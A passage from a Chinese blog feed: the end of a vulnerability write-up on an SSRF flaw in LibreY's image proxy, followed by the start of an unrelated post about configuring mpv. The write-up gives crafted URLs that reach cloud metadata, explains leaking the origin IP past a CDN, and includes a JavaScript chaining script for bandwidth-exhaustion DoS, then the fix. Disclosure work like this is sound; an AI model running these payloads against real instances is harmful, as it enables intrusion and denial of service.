<span><span style="color: #403F53">     </span><span style="color: #111111">$split_url</span><span style="color: #403F53"> </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #4876D6">explode</span><span style="color: #403F53">(</span><span style="color: #111111">&quot;</span><span style="color: #C96765">/</span><span style="color: #111111">&quot;</span><span style="color: #403F53">,</span><span style="color: #4876D6"> </span><span style="color: #403F53">$</span><span style="color: #111111">url</span><span style="color: #403F53">); </span></span>
<span><span style="color: #403F53">     </span><span style="color: #111111">$base_url</span><span style="color: #403F53"> </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #111111">$split_url</span><span style="color: #403F53">[</span><span style="color: #AA0982">2</span><span style="color: #403F53">]; </span></span>
<span><span style="color: #403F53">  </span></span>
<span><span style="color: #403F53">     </span><span style="color: #111111">$base_url_main_split</span><span style="color: #403F53"> </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #4876D6">explode</span><span style="color: #403F53">(</span><span style="color: #111111">&quot;</span><span style="color: #C96765">.</span><span style="color: #111111">&quot;</span><span style="color: #403F53">,</span><span style="color: #4876D6"> </span><span style="color: #4876D6">strrev</span><span style="color: #403F53">($</span><span style="color: #111111">base_url</span><span style="color: #403F53">)); </span></span>
<span><span style="color: #403F53">     </span><span style="color: #111111">$root_domain</span><span style="color: #403F53"> </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #4876D6">strrev</span><span style="color: #403F53">($</span><span style="color: #111111">base_url_main_split</span><span style="color: #403F53">[</span><span style="color: #AA0982">1</span><span style="color: #403F53">]) </span><span style="color: #0C969B">.</span><span style="color: #403F53"> </span><span style="color: #111111">&quot;</span><span style="color: #C96765">.</span><span style="color: #111111">&quot;</span><span style="color: #403F53"> </span><span style="color: #0C969B">.</span><span style="color: #403F53"> </span><span style="color: #4876D6">strrev</span><span style="color: #403F53">($</span><span style="color: #111111">base_url_main_split</span><span style="color: #403F53">[</span><span style="color: #AA0982">0</span><span style="color: #403F53">]); </span></span>
<span><span style="color: #403F53">  </span></span>
<span><span style="color: #403F53">     </span><span style="color: #994CC3">return</span><span style="color: #403F53"> </span><span style="color: #111111">$root_domain</span><span style="color: #403F53">; </span></span>
<span><span style="color: #403F53"> }</span></span></code></pre></div></section>
<p>这一看就非常灵车<span class="mojikumi-line-start">（</span><span class="mojikumi-line-end">，</span>它依赖于 URL 的标准形式<span class="mojikumi-line-end">，</span>即以 <code>http(s)://</code> 开头<span class="mojikumi-line-end">。</span>但是实际上 scheme 可以全部省略<span class="mojikumi-line-end">，</span>或者只留一个 slash 而非两个<span class="mojikumi-line-end">，</span>所以 <code>/<wbr>image_proxy<wbr>.<wbr>php<wbr>?<wbr>url<wbr>=<wbr>example<wbr>.<wbr>com<wbr>//<wbr>qwant<wbr>.<wbr>com<wbr>/../../</code> 或者 <code>/<wbr>image_proxy<wbr>.<wbr>php<wbr>?<wbr>url<wbr>=<wbr>https<wbr>:/<wbr>example<wbr>.<wbr>com<wbr>/<wbr>qwant<wbr>.<wbr>com<wbr>/../</code> 都可以通过这里的检查<span class="mojikumi-line-end">，</span>从而造成 SSRF<span class="mojikumi-line-end">。</span></p>
<h2 id="利用" class="heading"><a href="#利用" class="heading-anchor" aria-label="章节： 利用" tabindex="-1"></a><span>利用</span></h2>
<h3 id="访问内网资源" class="heading"><a href="#访问内网资源" class="heading-anchor" aria-label="章节： 访问内网资源" tabindex="-1"></a><span>访问内网资源</span></h3>
<p>如果实例部署在 VPS 上可能可以在 169.254.169.254 获取到一些 metadata: <code>/<wbr>image_proxy<wbr>.<wbr>php<wbr>?<wbr>url<wbr>=<wbr>169<wbr>.<wbr>254<wbr>.<wbr>169<wbr>.<wbr>254<wbr>//<wbr>qwant<wbr>.<wbr>com<wbr>/../../<wbr>latest<wbr>/</code> 或 <code>/<wbr>image_proxy<wbr>.<wbr>php<wbr>?<wbr>url<wbr>=<wbr>169<wbr>.<wbr>254<wbr>.<wbr>169<wbr>.<wbr>254<wbr>//<wbr>qwant<wbr>.<wbr>com<wbr>/../../<wbr>opc<wbr>/<wbr>v1<wbr>/<wbr>instance<wbr>/</code><span class="mojikumi-line-end">。</span></p>
<p>还可以对 localhost 做端口扫描<span class="mojikumi-line-end">、</span>对内网 IP 地址的常用端口进行扫描之类的<span class="mojikumi-line-end">。</span></p>
<p>默认配置中限制了 protocol 为 HTTP(S)<span class="mojikumi-line-end">，</span>所以无法访问本地文件之类的<span class="mojikumi-line-end">。</span></p>
<h3 id="获取源站-ip-地址" class="heading"><a href="#获取源站-ip-地址" class="heading-anchor" aria-label="章节： 获取源站 IP 地址" tabindex="-1"></a><span>获取源站 IP 地址</span></h3>
<p>如果用了 CDN<span class="mojikumi-line-end">，</span>服务器的地址可能是隐藏的<span class="mojikumi-line-end">。</span>可以向攻击者控制的服务器或 <a href="https://requestrepo.com/">https<wbr>://<wbr>requestrepo<wbr>.<wbr>com<wbr>/</a> 之类的发送请求来获得服务器的 IP 地址<span class="mojikumi-line-end">，</span>从而绕开 CDN 进行 DDoS 之类的攻击<span class="mojikumi-line-end">。</span></p>
<h3 id="dos" class="heading"><a href="#dos" class="heading-anchor" aria-label="章节： DoS" tabindex="-1"></a><span>DoS</span></h3>
<p>可以让服务器请求大文件来消耗服务器带宽<span class="mojikumi-line-start">（</span>攻击者不需要接收 response 从而不需要消耗带宽<span class="mojikumi">）</span><span class="mojikumi-line-end">，</span>但实际上一般下载到一半就超时中断了<span class="mojikumi-line-end">，</span>效果和下载一张较大的图片<span class="mojikumi-line-start">（</span>没有漏洞也能做到<span class="mojikumi-line-end">）</span>差不多<span class="mojikumi-line-end">。</span></p>
<p>但是通过任意 URL 的访问<span class="mojikumi-line-end">，</span>可以套娃<span class="mojikumi-line-end">，</span>例如 <code>http<wbr>://<wbr>librex<wbr>.<wbr>b<wbr>.<wbr>com<wbr>/<wbr>image_proxy<wbr>.<wbr>php<wbr>?<wbr>url<wbr>=<wbr>https<wbr>:/<wbr>librex<wbr>.<wbr>a<wbr>.<wbr>com<wbr>/<wbr>qwant<wbr>.<wbr>com<wbr>/..//<wbr>image_proxy<wbr>.<wbr>php<wbr>?<wbr>url<wbr>=<wbr>http<wbr>:/<wbr>librex<wbr>.<wbr>b<wbr>.<wbr>com<wbr>/<wbr>qwant<wbr>.<wbr>com<wbr>/..//<wbr>image_proxy<wbr>.<wbr>php<wbr>?<wbr>url<wbr>=<wbr>https<wbr>:/<wbr>librex<wbr>.<wbr>a<wbr>.<wbr>com<wbr>/<wbr>qwant<wbr>.<wbr>com<wbr>/..//<wbr>image_proxy<wbr>.<wbr>php<wbr>?<wbr>url<wbr>=<wbr>http<wbr>:/<wbr>speedtest<wbr>.<wbr>ftp<wbr>.<wbr>otenet<wbr>.<wbr>gr<wbr>/<wbr>qwant<wbr>.<wbr>com<wbr>/..//<wbr>files<wbr>/<wbr>test10Mb<wbr>.<wbr>db</code><span class="mojikumi-line-end">。</span></p>
<section class="code-block relative my-6 shadow" itemprop="hasPart" itemscope itemtype="https://schema.org/SoftwareSourceCode" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h4 class="text-3 text-footer" itemprop="programmingLanguage" aria-label="JavaScript 代码块" data-v-ad49d235>JavaScript</h4><ile-root id="ile-42"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-42--></div><div class="light:hidden" itemprop="text" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><code><span><span style="color: #C792EA">const </span><span style="color: #82AAFF">INSTANCES</span><span style="color: #C792EA"> =</span><span style="color: #D6DEEB"> [</span></span>
<span><span style="color: #D6DEEB">  </span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">https://librex.a.com/</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D6DEEB">,</span></span>
<span><span style="color: #D6DEEB">  </span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">https://librex.b.com/</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D6DEEB">,</span></span>
<span><span style="color: #D6DEEB">  </span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">https://librex.c.com/</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D6DEEB">,</span></span>
<span><span style="color: #D6DEEB">];</span></span>
<span><span style="color: #C792EA">const </span><span style="color: #82AAFF">FINAL_TARGET</span><span style="color: #C792EA"> = </span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">http://speedtest.ftp.otenet.gr/files/test10Mb.db</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D6DEEB">;</span></span>
<span><span style="color: #C792EA">const </span><span style="color: #82AAFF">NUMBER_OF_ROUNDS</span><span style="color: #C792EA"> = </span><span style="color: #F78C6C">25</span><span style="color: #D6DEEB">;</span></span>
<span><span style="color: #C792EA">const </span><span style="color: #82AAFF">NUMBER_OF_REQUESTS</span><span style="color: #C792EA"> = </span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">;</span></span>
<span></span>
<span><span style="color: #C792EA">function</span><span style="color: #D6DEEB"> </span><span style="color: #82AAFF">manipulatedUrlParam</span><span style="color: #D9F5DD">(</span><span style="color: #D7DBE0">url</span><span style="color: #D9F5DD">)</span><span style="color: #D6DEEB"> {</span></span>
<span><span style="color: #D6DEEB">  </span><span style="color: #C792EA">const </span><span style="color: #82AAFF">u</span><span style="color: #C792EA"> = </span><span style="color: #7FDBCA">new</span><span style="color: #C792EA"> </span><span style="color: #82AAFF">URL</span><span style="color: #D6DEEB">(</span><span style="color: #D7DBE0">url</span><span style="color: #D6DEEB">);</span></span>
<span><span style="color: #D6DEEB">  </span><span style="color: #C792EA">return</span><span style="color: #D6DEEB"> </span><span style="color: #D6DEEB">`</span><span style="color: #D3423E">${</span><span style="color: #7FDBCA">u</span><span style="color: #C792EA">.</span><span style="color: #7FDBCA">protocol</span><span style="color: #D3423E">}</span><span style="color: #ECC48D">/</span><span style="color: #D3423E">${</span><span style="color: #7FDBCA">u</span><span style="color: #C792EA">.</span><span style="color: #7FDBCA">host</span><span style="color: #D3423E">}</span><span style="color: #ECC48D">/qwant.com/../</span><span style="color: #D3423E">${</span><span style="color: #7FDBCA">u</span><span style="color: #C792EA">.</span><span style="color: #7FDBCA">pathname</span><span style="color: #D3423E">}${</span><span style="color: #7FDBCA">u</span><span style="color: #C792EA">.</span><span style="color: #7FDBCA">search</span><span style="color: #D3423E">}</span><span style="color: #D6DEEB">`</span><span style="color: #D6DEEB">;</span></span>
<span><span style="color: #D6DEEB">}</span></span>
<span></span>
<span><span style="color: #C792EA">function</span><span style="color: #D6DEEB"> </span><span style="color: #82AAFF">imageProxyUrl</span><span style="color: #D9F5DD">(</span><span style="color: #D7DBE0">instance</span><span style="color: #D6DEEB">, </span><span style="color: #D7DBE0">target</span><span style="color: #D9F5DD">)</span><span style="color: #D6DEEB"> {</span></span>
<span><span style="color: #D6DEEB">  </span><span style="color: #C792EA">const </span><span style="color: #82AAFF">u</span><span style="color: #C792EA"> = </span><span style="color: #7FDBCA">new</span><span style="color: #C792EA"> </span><span style="color: #82AAFF">URL</span><span style="color: #D6DEEB">(</span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">image_proxy.php</span><span style="color: #D9F5DD">&quot;</span><span style="color: #5F7E97">,</span><span style="color: #C792EA"> </span><span style="color: #D7DBE0">instance</span><span style="color: #D6DEEB">);</span></span>
<span><span style="color: #D6DEEB">  </span><span style="color: #7FDBCA">u</span><span style="color: #C792EA">.</span><span style="color: #7FDBCA">search</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #7FDBCA">new</span><span style="color: #D6DEEB"> </span><span style="color: #82AAFF">URLSearchParams</span><span style="color: #D6DEEB">({ url: </span><span style="color: #82AAFF">manipulatedUrlParam</span><span style="color: #D6DEEB">(</span><span style="color: #D7DBE0">target</span><span style="color: #D6DEEB">) });</span></span>
<span><span style="color: #D6DEEB">  </span><span style="color: #637777">// u.search = `?url=${manipulatedUrlParam(target)}`;</span></span>
<span><span style="color: #D6DEEB">  </span><span style="color: #C792EA">return</span><span style="color: #D6DEEB"> </span><span style="color: #7FDBCA">u</span><span style="color: #C792EA">.</span><span style="color: #82AAFF">toString</span><span style="color: #D6DEEB">();</span></span>
<span><span style="color: #D6DEEB">}</span></span>
<span></span>
<span><span style="color: #C792EA">let </span><span style="color: #D7DBE0">chainedUrl</span><span style="color: #C792EA"> = </span><span style="color: #82AAFF">FINAL_TARGET</span><span style="color: #D6DEEB">;</span></span>
<span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> (</span><span style="color: #C792EA">let </span><span style="color: #D7DBE0">i</span><span style="color: #C792EA"> = </span><span style="color: #F78C6C">0</span><span style="color: #D6DEEB">; </span><span style="color: #D7DBE0">i</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">&lt;</span><span style="color: #D6DEEB"> </span><span style="color: #82AAFF">NUMBER_OF_ROUNDS</span><span style="color: #D6DEEB">; </span><span style="color: #D7DBE0">i</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">+=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">) {</span></span>
<span><span style="color: #D6DEEB">  </span><span style="color: #D7DBE0">chainedUrl</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #82AAFF">imageProxyUrl</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">INSTANCES</span><span style="color: #D6DEEB">[</span><span style="color: #D7DBE0">i</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">%</span><span style="color: #D6DEEB"> </span><span style="color: #82AAFF">INSTANCES</span><span style="color: #C792EA">.</span><span style="color: #7FDBCA">length</span><span style="color: #D6DEEB">], </span><span style="color: #D7DBE0">chainedUrl</span><span style="color: #D6DEEB">);</span></span>
<span><span style="color: #D6DEEB">}</span></span>
<span><span style="color: #7FDBCA">console</span><span style="color: #C792EA">.</span><span style="color: #82AAFF">log</span><span style="color: #D6DEEB">(</span><span style="color: #D7DBE0">chainedUrl</span><span style="color: #D6DEEB">);</span></span>
<span></span>
<span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> (</span><span style="color: #C792EA">let </span><span style="color: #D7DBE0">i</span><span style="color: #C792EA"> = </span><span style="color: #F78C6C">0</span><span style="color: #D6DEEB">; </span><span style="color: #D7DBE0">i</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">&lt;</span><span style="color: #D6DEEB"> </span><span style="color: #82AAFF">NUMBER_OF_REQUESTS</span><span style="color: #D6DEEB">; </span><span style="color: #D7DBE0">i</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">+=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">) {</span></span>
<span><span style="color: #D6DEEB">  </span><span style="color: #7FDBCA">console</span><span style="color: #C792EA">.</span><span style="color: #82AAFF">time</span><span style="color: #D6DEEB">(</span><span style="color: #D6DEEB">`</span><span style="color: #ECC48D">fetch </span><span style="color: #D3423E">${</span><span style="color: #D7DBE0">i</span><span style="color: #D3423E">}</span><span style="color: #D6DEEB">`</span><span style="color: #D6DEEB">);</span></span>
<span><span style="color: #D6DEEB">  </span><span style="color: #82AAFF">fetch</span><span style="color: #D6DEEB">(</span><span style="color: #D7DBE0">chainedUrl</span><span style="color: #D6DEEB">)</span><span style="color: #C792EA">.</span><span style="color: #82AAFF">then</span><span style="color: #D6DEEB">(</span><span style="color: #D9F5DD">(</span><span style="color: #D7DBE0">res</span><span style="color: #D9F5DD">)</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">=&gt;</span><span style="color: #D6DEEB"> {</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #7FDBCA">console</span><span style="color: #C792EA">.</span><span style="color: #82AAFF">timeEnd</span><span style="color: #D6DEEB">(</span><span style="color: #D6DEEB">`</span><span style="color: #ECC48D">fetch </span><span style="color: #D3423E">${</span><span style="color: #D7DBE0">i</span><span style="color: #D3423E">}</span><span style="color: #D6DEEB">`</span><span style="color: #D6DEEB">);</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #7FDBCA">console</span><span style="color: #C792EA">.</span><span style="color: #82AAFF">log</span><span style="color: #D6DEEB">(</span><span style="color: #D6DEEB">`</span><span style="color: #D3423E">${</span><span style="color: #7FDBCA">res</span><span style="color: #C792EA">.</span><span style="color: #7FDBCA">status</span><span style="color: #D3423E">}</span><span style="color: #ECC48D">: </span><span style="color: #D3423E">${</span><span style="color: #7FDBCA">res</span><span style="color: #C792EA">.</span><span style="color: #7FDBCA">statusText</span><span style="color: #D3423E">}</span><span style="color: #D6DEEB">`</span><span style="color: #D6DEEB">);</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #7FDBCA">console</span><span style="color: #C792EA">.</span><span style="color: #82AAFF">log</span><span style="color: #D6DEEB">(</span><span style="color: #D6DEEB">`</span><span style="color: #ECC48D">Content-Type: </span><span style="color: #D3423E">${</span><span style="color: #7FDBCA">res</span><span style="color: #C792EA">.</span><span style="color: #FAF39F">headers</span><span style="color: #C792EA">.</span><span style="color: #82AAFF">get</span><span style="color: #D6DEEB">(</span><span style="color: #D6DEEB">&#39;</span><span style="color: #ECC48D">Content-Type</span><span style="color: #D6DEEB">&#39;</span><span style="color: #D6DEEB">)</span><span style="color: #D3423E">}</span><span style="color: #D6DEEB">`</span><span style="color: #D6DEEB">);</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #637777">// res.text().then((t) =&gt; console.log(`Body Length: ${t.length}`));</span></span>
<span><span style="color: #D6DEEB">  });</span></span>
<span><span style="color: #D6DEEB">}</span></span></code></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><code><span><span style="color: #994CC3">const </span><span style="color: #4876D6">INSTANCES</span><span style="color: #994CC3"> =</span><span style="color: #403F53"> [</span></span>
<span><span style="color: #403F53">  </span><span style="color: #111111">&#39;</span><span style="color: #C96765">https://librex.a.com/</span><span style="color: #111111">&#39;</span><span style="color: #403F53">,</span></span>
<span><span style="color: #403F53">  </span><span style="color: #111111">&#39;</span><span style="color: #C96765">https://librex.b.com/</span><span style="color: #111111">&#39;</span><span style="color: #403F53">,</span></span>
<span><span style="color: #403F53">  </span><span style="color: #111111">&#39;</span><span style="color: #C96765">https://librex.c.com/</span><span style="color: #111111">&#39;</span><span style="color: #403F53">,</span></span>
<span><span style="color: #403F53">];</span></span>
<span><span style="color: #994CC3">const </span><span style="color: #4876D6">FINAL_TARGET</span><span style="color: #994CC3"> = </span><span style="color: #111111">&#39;</span><span style="color: #C96765">http://speedtest.ftp.otenet.gr/files/test10Mb.db</span><span style="color: #111111">&#39;</span><span style="color: #403F53">;</span></span>
<span><span style="color: #994CC3">const </span><span style="color: #4876D6">NUMBER_OF_ROUNDS</span><span style="color: #994CC3"> = </span><span style="color: #AA0982">25</span><span style="color: #403F53">;</span></span>
<span><span style="color: #994CC3">const </span><span style="color: #4876D6">NUMBER_OF_REQUESTS</span><span style="color: #994CC3"> = </span><span style="color: #AA0982">1</span><span style="color: #403F53">;</span></span>
<span></span>
<span><span style="color: #994CC3">function</span><span style="color: #403F53"> </span><span style="color: #4876D6">manipulatedUrlParam</span><span style="color: #111111">(</span><span style="color: #403F53">url</span><span style="color: #111111">)</span><span style="color: #403F53"> {</span></span>
<span><span style="color: #403F53">  </span><span style="color: #994CC3">const </span><span style="color: #4876D6">u</span><span style="color: #994CC3"> = </span><span style="color: #0C969B">new</span><span style="color: #994CC3"> </span><span style="color: #4876D6">URL</span><span style="color: #403F53">(url);</span></span>
<span><span style="color: #403F53">  </span><span style="color: #994CC3">return</span><span style="color: #403F53"> </span><span style="color: #403F53">`</span><span style="color: #D3423E">${</span><span style="color: #0C969B">u</span><span style="color: #994CC3">.</span><span style="color: #0C969B">protocol</span><span style="color: #D3423E">}</span><span style="color: #4876D6">/</span><span style="color: #D3423E">${</span><span style="color: #0C969B">u</span><span style="color: #994CC3">.</span><span style="color: #0C969B">host</span><span style="color: #D3423E">}</span><span style="color: #4876D6">/qwant.com/../</span><span style="color: #D3423E">${</span><span style="color: #0C969B">u</span><span style="color: #994CC3">.</span><span style="color: #0C969B">pathname</span><span style="color: #D3423E">}${</span><span style="color: #0C969B">u</span><span style="color: #994CC3">.</span><span style="color: #0C969B">search</span><span style="color: #D3423E">}</span><span style="color: #403F53">`</span><span style="color: #403F53">;</span></span>
<span><span style="color: #403F53">}</span></span>
<span></span>
<span><span style="color: #994CC3">function</span><span style="color: #403F53"> </span><span style="color: #4876D6">imageProxyUrl</span><span style="color: #111111">(</span><span style="color: #403F53">instance, target</span><span style="color: #111111">)</span><span style="color: #403F53"> {</span></span>
<span><span style="color: #403F53">  </span><span style="color: #994CC3">const </span><span style="color: #4876D6">u</span><span style="color: #994CC3"> = </span><span style="color: #0C969B">new</span><span style="color: #994CC3"> </span><span style="color: #4876D6">URL</span><span style="color: #403F53">(</span><span style="color: #111111">&quot;</span><span style="color: #C96765">image_proxy.php</span><span style="color: #111111">&quot;</span><span style="color: #5F7E97">,</span><span style="color: #994CC3"> </span><span style="color: #403F53">instance);</span></span>
<span><span style="color: #403F53">  </span><span style="color: #0C969B">u</span><span style="color: #994CC3">.</span><span style="color: #0C969B">search</span><span style="color: #403F53"> </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #0C969B">new</span><span style="color: #403F53"> </span><span style="color: #4876D6">URLSearchParams</span><span style="color: #403F53">({ url: </span><span style="color: #4876D6">manipulatedUrlParam</span><span style="color: #403F53">(target) });</span></span>
<span><span style="color: #403F53">  </span><span style="color: #939DBB">// u.search = `?url=${manipulatedUrlParam(target)}`;</span></span>
<span><span style="color: #403F53">  </span><span style="color: #994CC3">return</span><span style="color: #403F53"> </span><span style="color: #0C969B">u</span><span style="color: #994CC3">.</span><span style="color: #4876D6">toString</span><span style="color: #403F53">();</span></span>
<span><span style="color: #403F53">}</span></span>
<span></span>
<span><span style="color: #994CC3">let </span><span style="color: #403F53">chainedUrl</span><span style="color: #994CC3"> = </span><span style="color: #4876D6">FINAL_TARGET</span><span style="color: #403F53">;</span></span>
<span><span style="color: #994CC3">for</span><span style="color: #403F53"> (</span><span style="color: #994CC3">let </span><span style="color: #403F53">i</span><span style="color: #994CC3"> = </span><span style="color: #AA0982">0</span><span style="color: #403F53">; i </span><span style="color: #994CC3">&lt;</span><span style="color: #403F53"> </span><span style="color: #4876D6">NUMBER_OF_ROUNDS</span><span style="color: #403F53">; i </span><span style="color: #994CC3">+=</span><span style="color: #403F53"> </span><span style="color: #AA0982">1</span><span style="color: #403F53">) {</span></span>
<span><span style="color: #403F53">  chainedUrl </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #4876D6">imageProxyUrl</span><span style="color: #403F53">(</span><span style="color: #4876D6">INSTANCES</span><span style="color: #403F53">[i </span><span style="color: #994CC3">%</span><span style="color: #403F53"> </span><span style="color: #4876D6">INSTANCES</span><span style="color: #994CC3">.</span><span style="color: #0C969B">length</span><span style="color: #403F53">], chainedUrl);</span></span>
<span><span style="color: #403F53">}</span></span>
<span><span style="color: #0C969B">console</span><span style="color: #994CC3">.</span><span style="color: #4876D6">log</span><span style="color: #403F53">(chainedUrl);</span></span>
<span></span>
<span><span style="color: #994CC3">for</span><span style="color: #403F53"> (</span><span style="color: #994CC3">let </span><span style="color: #403F53">i</span><span style="color: #994CC3"> = </span><span style="color: #AA0982">0</span><span style="color: #403F53">; i </span><span style="color: #994CC3">&lt;</span><span style="color: #403F53"> </span><span style="color: #4876D6">NUMBER_OF_REQUESTS</span><span style="color: #403F53">; i </span><span style="color: #994CC3">+=</span><span style="color: #403F53"> </span><span style="color: #AA0982">1</span><span style="color: #403F53">) {</span></span>
<span><span style="color: #403F53">  </span><span style="color: #0C969B">console</span><span style="color: #994CC3">.</span><span style="color: #4876D6">time</span><span style="color: #403F53">(</span><span style="color: #403F53">`</span><span style="color: #4876D6">fetch </span><span style="color: #D3423E">${</span><span style="color: #403F53">i</span><span style="color: #D3423E">}</span><span style="color: #403F53">`</span><span style="color: #403F53">);</span></span>
<span><span style="color: #403F53">  </span><span style="color: #4876D6">fetch</span><span style="color: #403F53">(chainedUrl)</span><span style="color: #994CC3">.</span><span style="color: #4876D6">then</span><span style="color: #403F53">(</span><span style="color: #111111">(</span><span style="color: #403F53">res</span><span style="color: #111111">)</span><span style="color: #403F53"> </span><span style="color: #994CC3">=&gt;</span><span style="color: #403F53"> {</span></span>
<span><span style="color: #403F53">    </span><span style="color: #0C969B">console</span><span style="color: #994CC3">.</span><span style="color: #4876D6">timeEnd</span><span style="color: #403F53">(</span><span style="color: #403F53">`</span><span style="color: #4876D6">fetch </span><span style="color: #D3423E">${</span><span style="color: #403F53">i</span><span style="color: #D3423E">}</span><span style="color: #403F53">`</span><span style="color: #403F53">);</span></span>
<span><span style="color: #403F53">    </span><span style="color: #0C969B">console</span><span style="color: #994CC3">.</span><span style="color: #4876D6">log</span><span style="color: #403F53">(</span><span style="color: #403F53">`</span><span style="color: #D3423E">${</span><span style="color: #0C969B">res</span><span style="color: #994CC3">.</span><span style="color: #0C969B">status</span><span style="color: #D3423E">}</span><span style="color: #4876D6">: </span><span style="color: #D3423E">${</span><span style="color: #0C969B">res</span><span style="color: #994CC3">.</span><span style="color: #0C969B">statusText</span><span style="color: #D3423E">}</span><span style="color: #403F53">`</span><span style="color: #403F53">);</span></span>
<span><span style="color: #403F53">    </span><span style="color: #0C969B">console</span><span style="color: #994CC3">.</span><span style="color: #4876D6">log</span><span style="color: #403F53">(</span><span style="color: #403F53">`</span><span style="color: #4876D6">Content-Type: </span><span style="color: #D3423E">${</span><span style="color: #0C969B">res</span><span style="color: #994CC3">.</span><span style="color: #111111">headers</span><span style="color: #994CC3">.</span><span style="color: #4876D6">get</span><span style="color: #403F53">(</span><span style="color: #403F53">&#39;</span><span style="color: #C96765">Content-Type</span><span style="color: #403F53">&#39;</span><span style="color: #403F53">)</span><span style="color: #D3423E">}</span><span style="color: #403F53">`</span><span style="color: #403F53">);</span></span>
<span><span style="color: #403F53">    </span><span style="color: #939DBB">// res.text().then((t) =&gt; console.log(`Body Length: ${t.length}`));</span></span>
<span><span style="color: #403F53">  });</span></span>
<span><span style="color: #403F53">}</span></span></code></pre></div></section>
<p>这样的话攻击者的一次请求就可以让服务器发送很多请求<span class="mojikumi-line-end">，</span>也能同时消耗服务器的上行和下行带宽<span class="mojikumi-line-end">，</span>并且同时攻击多个实例<span class="mojikumi-line-end">。</span></p>
<p>不同实例的攻击难度不同<span class="mojikumi-line-end">，</span>可能和服务器配置有关<span class="mojikumi-line-end">，</span>比较菜的服务器通过套娃一次请求就可以十几秒无响应<span class="mojikumi-line-end">。</span></p>
<h2 id="修复" class="heading"><a href="#修复" class="heading-anchor" aria-label="章节： 修复" tabindex="-1"></a><span>修复</span></h2>
<p><a href="https://github.com/Ahwxorg/LibreY/pull/31/files">https<wbr>://<wbr>github<wbr>.<wbr>com<wbr>/<wbr>Ahwxorg<wbr>/<wbr>LibreY<wbr>/<wbr>pull<wbr>/<wbr>31<wbr>/<wbr>files</a> <span class="mojikumi">（</span><s>这个 PR 的名字好崩溃</s><span class="mojikumi-line-end">）</span></p>
<p>用 <a href="https://www.php.net/manual/en/function.parse-url.php"><code>parse_url</code></a> 就行<span class="mojikumi-line-end">，</span>不知道当初作者为啥想不开自己造了个方轮子<span class="mojikumi-line-start">（</span></p>]]></content:encoded>
            <category domain="https://ouuan.moe/tag/url-parsing">url-parsing</category>
            <category domain="https://ouuan.moe/tag/ssrf">ssrf</category>
            <category domain="https://ouuan.moe/tag/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">漏洞分析</category>
        </item>
        <item>
            <title><![CDATA[配一下 mpv]]></title>
            <link>https://ouuan.moe/post/2023/08/mpv-tweaks</link>
            <guid>https://ouuan.moe/post/2023/08/mpv-tweaks</guid>
            <pubDate>Tue, 08 Aug 2023 13:26:50 GMT</pubDate>
            <description><![CDATA[<p>mpv 是一款 <s>神似 vim 的</s> 媒体播放器<span class="mojikumi-line-end">，</span>就是说第一眼有点劝退<span class="mojikumi-line-end">，</span>配置项很多<span class="mojikumi-line-end">，</span>但如果能花点时间进行配置还是挺香的<span class="mojikumi-line-end">，</span>而且可以写脚本实现各种功能<span class="mojikumi-line-end">。</span></p>
]]></description>
            <content:encoded><![CDATA[<p>mpv 是一款 <s>神似 vim 的</s> 媒体播放器<span class="mojikumi-line-end">，</span>就是说第一眼有点劝退<span class="mojikumi-line-end">，</span>配置项很多<span class="mojikumi-line-end">，</span>但如果能花点时间进行配置还是挺香的<span class="mojikumi-line-end">，</span>而且可以写脚本实现各种功能<span class="mojikumi-line-end">。</span></p>

